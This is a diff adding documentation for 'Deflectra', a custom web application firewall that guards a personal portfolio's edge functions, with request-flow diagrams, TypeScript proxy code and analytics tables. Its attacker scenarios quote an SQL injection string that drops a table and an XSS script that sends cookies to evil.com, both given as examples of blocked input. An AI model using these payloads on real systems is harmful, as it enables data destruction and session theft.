@@ -48,6 +48,13 @@ This documentation covers the complete system architecture, data flows, implemen
 - [IP Block List System](#ip-block-list-system)
 - [Geographic Blocking Rules System](#geographic-blocking-rules-system)
 
+### Deflectra WAF (Web Application Firewall)
+- [Deflectra WAF Overview](#deflectra-waf-overview)
+- [How Deflectra Works: Visitor Perspective](#how-deflectra-works-visitor-perspective)
+- [How Deflectra Works: Attacker Perspective](#how-deflectra-works-attacker-perspective)
+- [WAF Request Flow](#waf-request-flow)
+- [WAF Analytics and Monitoring](#waf-analytics-and-monitoring)
+
 ### Security Architecture & Threat Mitigation
 - [Security Architecture Overview](#security-architecture-overview)
 - [Identified Threats and Mitigation Strategies](#identified-threats-and-mitigation-strategies)
@@ -2522,6 +2529,226 @@ The owner dashboard includes WAF Analytics with summary cards, 7-day trend chart
 If the WAF proxy is unreachable, requests proceed directly to edge functions to ensure availability. Fallback events are logged with reason `proxy_fallback`.
 
 With security systems in place to block threats, the portfolio keeps the owner informed through a comprehensive automated email notification system.
+
+---
+
+## Deflectra WAF Overview
+
+Deflectra is a custom-built Web Application Firewall (WAF) that acts as **Layer 0** of this portfolio's security architecture — the first line of defense before any dynamic request reaches the backend. While the portfolio's static assets (HTML, CSS, JavaScript) are served directly from the hosting platform without interception, all dynamic API traffic — chatbot queries, contact form submissions, authentication attempts, and alert triggers — is routed through the Deflectra WAF proxy for real-time inspection.
+
+### What Deflectra Achieves for This Portfolio
+
+The portfolio exposes several edge functions that accept user input (chatbot messages, contact form data, login credentials). Without a WAF, these endpoints are directly accessible and vulnerable to:
+
+- **SQL Injection (SQLi)** — Malicious database queries injected through input fields
+- **Cross-Site Scripting (XSS)** — Script injection through chatbot messages or contact forms
+- **Abuse and spam** — Automated bots flooding the contact form or chatbot
+- **Reconnaissance** — Probing edge function endpoints for vulnerabilities
+
+Deflectra inspects every request payload against a ruleset of known attack patterns *before* the request ever reaches the actual edge function, acting as a security gateway.
+
+### Protected Functions
+
+The following edge functions are routed through Deflectra in **full proxy mode**:
+
+| Edge Function | Purpose | Why It Needs WAF Protection |
+|---|---|---|
+| `portfolio-chatbot` | AI chatbot responses | Accepts free-text user input — prime target for prompt injection and XSS |
+| `send-contact-email` | Contact form emails | Accepts name, email, and message — classic SQLi/XSS attack surface |
+| `log-auth-attempt` | Login attempt logging | Records authentication data — attacker could inject malicious payloads |
+| `send-visitor-alert` | Visitor notification emails | Processes visitor session data that could contain crafted payloads |
+| `send-recruiter-alert` | Recruiter notification emails | Processes visitor classification data |
+
+---
+
+## How Deflectra Works: Visitor Perspective
+
+From a legitimate visitor's perspective, Deflectra is completely invisible. Here is what happens when a normal user interacts with the portfolio:
+
+**1. Browsing the Portfolio (No WAF Involvement)**
+
+When a visitor opens the portfolio website, the browser loads static assets — HTML, CSS, JavaScript bundles, images, and fonts. These are served directly from the hosting CDN. Deflectra does not inspect or intercept static content because there is no user input to validate and no attack surface.
+
+**2. Sending a Chatbot Message**
+
+When the visitor types "What programming languages does Ritvik know?" into the AI chatbot:
+
+1. The frontend's `smartInvoke()` function detects that `portfolio-chatbot` is a WAF-protected function
+2. Instead of calling the edge function directly, the request is sent to the **Deflectra WAF proxy**
+3. Deflectra inspects the request payload — the message is clean natural language, so it passes all rules
+4. Deflectra forwards the request to the actual `portfolio-chatbot` edge function
+5. The edge function generates embeddings, performs semantic search, and returns the AI response
+6. The response flows back through Deflectra to the visitor's browser
+
+The visitor experiences no additional latency perceptible to humans. The entire WAF inspection adds only milliseconds.
+
+**3. Submitting the Contact Form**
+
+When the visitor fills out the contact form with their name, email, and a message:
+
+1. The frontend routes the request through Deflectra's WAF proxy
+2. Deflectra validates the payload — no SQL keywords, no script tags, no suspicious patterns
+3. The clean request is forwarded to `send-contact-email`
+4. The email is sent via Resend API
+5. The visitor sees a success confirmation
+
+**Key Point**: For legitimate users, the WAF is a transparent security layer that protects them as much as it protects the application — ensuring no malicious content from other users could compromise the system they're interacting with.
+
+---
+
+## How Deflectra Works: Attacker Perspective
+
+From an attacker's perspective, Deflectra acts as an impenetrable gate that blocks malicious requests before they reach any backend logic.
+
+**Scenario 1: SQL Injection Attempt via Contact Form**
+
+An attacker submits a contact form with the message field containing:
+```
+'; DROP TABLE visitor_activity; --
+```
+
+1. The frontend routes the request through Deflectra
+2. Deflectra's rule engine scans the payload and detects SQL injection patterns (`DROP TABLE`, SQL comment syntax `--`, string escape `'`)
+3. The request is **immediately blocked** with HTTP 403
+4. Deflectra returns a branded block page: *"Request Blocked — SQL Injection attempt detected"*
+5. The block event is logged in the `waf_events` table with `blocked: true` and the reason
+6. The actual `send-contact-email` edge function **never executes** — the attacker's payload never reaches the database layer
+7. The event appears in the Owner Dashboard WAF Analytics panel
+
+**Scenario 2: XSS Attack via AI Chatbot**
+
+An attacker sends a chatbot message containing:
+```
+<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+```
+
+1. The request is routed through Deflectra
+2. Deflectra detects `<script>` tags and JavaScript execution patterns
+3. The request is blocked — the malicious script never reaches the chatbot edge function
+4. Even if it somehow bypassed the WAF, additional layers (DOMPurify sanitization, Content Security Policy) provide defense-in-depth
+
+**Scenario 3: Automated Bot Flooding**
+
+A bot attempts to send hundreds of chatbot requests per minute:
+
+1. Each request hits Deflectra first
+2. Deflectra's rate limiting detects abnormal request frequency from the same origin
+3. After the threshold is exceeded, subsequent requests are blocked
+4. The edge function rate limiter (configured in `cors-rate-limit.ts`) provides a second layer of defense
+5. The portfolio remains responsive for legitimate visitors
+
+**Scenario 4: Reconnaissance and Probing**
+
+An attacker tries to probe edge function endpoints with malformed requests to discover vulnerabilities:
+
+1. All requests to protected functions must pass through Deflectra
+2. Malformed payloads, missing required fields, and suspicious headers are flagged
+3. The attacker receives generic block responses — no information about the backend is leaked
+4. All probing attempts are logged for the portfolio owner to review
+
+---
+
+## WAF Request Flow
+
+```mermaid
+flowchart TB
+    subgraph Client["Visitor's Browser"]
+        UI[Portfolio Frontend]
+        SI[smartInvoke Function]
+    end
+
+    subgraph Deflectra["Deflectra WAF Proxy"]
+        RP[Request Parser]
+        RE[Rule Engine]
+        RL[Rate Limiter]
+        AI[AI Analysis]
+        BP[Block Page]
+    end
+
+    subgraph Backend["Portfolio Backend"]
+        EF[Edge Functions]
+        DB[(Database)]
+        WE[(waf_events)]
+    end
+
+    UI -->|Dynamic Request| SI
+    SI -->|POST with payload| RP
+    RP --> RE
+    RE -->|Clean| RL
+    RE -->|Malicious| BP
+    RL -->|Within Limits| AI
+    RL -->|Exceeded| BP
+    AI -->|Safe| EF
+    AI -->|Suspicious| BP
+    BP -->|403 Blocked| UI
+    EF -->|Response| UI
+    EF --> DB
+    SI -->|Log Event| WE
+```
+
+**Figure WAF-1: Deflectra WAF Request Flow** - This diagram shows the complete request lifecycle through the Deflectra WAF proxy. Clean requests pass through multiple inspection stages before reaching the edge function. Malicious requests are blocked at the earliest detection point and never reach the backend.
+
+### Full Proxy Mode Implementation
+
+The portfolio operates Deflectra in **full proxy mode**, meaning the WAF doesn't just inspect requests — it also forwards clean requests to the actual edge function and returns the response. This is implemented in the frontend's `smartInvoke()` function:
+
+```typescript
+// src/lib/waf-proxy.ts — Smart invoke routes through WAF
+export async function smartInvoke(
+  functionName: string,
+  body?: Record<string, any>,
+): Promise<{ blocked: boolean; data?: any; error?: any }> {
+  // Skip WAF for non-protected functions
+  if (!WAF_ENABLED || !WAF_PROTECTED_FUNCTIONS.includes(functionName)) {
+    return { blocked: false };
+  }
+
+  // Full proxy mode: WAF inspects AND forwards to edge function
+  const result = await wafInvoke(functionName, body);
+  if (result.error?.waf_blocked) {
+    return { blocked: true, error: result.error };
+  }
+  return { blocked: false, data: result.data, error: result.error };
+}
+```
+
+### Fail-Open Design
+
+If the Deflectra WAF proxy is unreachable (network issues, service outage), the system **fails open** — requests fall back to calling the edge function directly. This ensures the portfolio remains functional even if the WAF is temporarily unavailable:
+
+```typescript
+// Fail-open fallback in wafInvoke()
+catch (error) {
+  console.warn('[WAF] Full proxy failed, falling back:', error);
+  await logWafEvent(functionName, false, 'proxy_fallback');
+  return directInvoke(functionName, body);  // Direct call to edge function
+}
+```
+
+This is a deliberate architectural decision: **availability over strict security**. For a portfolio website, a brief period without WAF inspection is acceptable — the edge functions still have their own input validation, rate limiting, and sanitization as defense-in-depth layers.
+
+---
+
+## WAF Analytics and Monitoring
+
+Every request that passes through Deflectra — whether allowed or blocked — is logged in the `waf_events` table:
+
+| Column | Description |
+|---|---|
+| `function_name` | Which edge function was targeted |
+| `blocked` | Whether the request was blocked (`true`/`false`) |
+| `reason` | Why it was blocked (e.g., "SQL Injection attempt detected") or null if allowed |
+| `waf_mode` | The WAF routing mode used (`full_proxy` or `preflight`) |
+| `created_at` | Timestamp of the event |
+
+The **Owner Dashboard** includes a dedicated WAF Analytics panel that visualizes:
+
+- **Allowed vs. Blocked requests** over time (bar chart)
+- **Block reasons** breakdown (which attack types are being attempted)
+- **Protected function distribution** (which endpoints are targeted most)
+- **Recent events log** with full details
+
+This gives the portfolio owner real-time visibility into the security posture and attack patterns targeting their application.
 
 ---
 
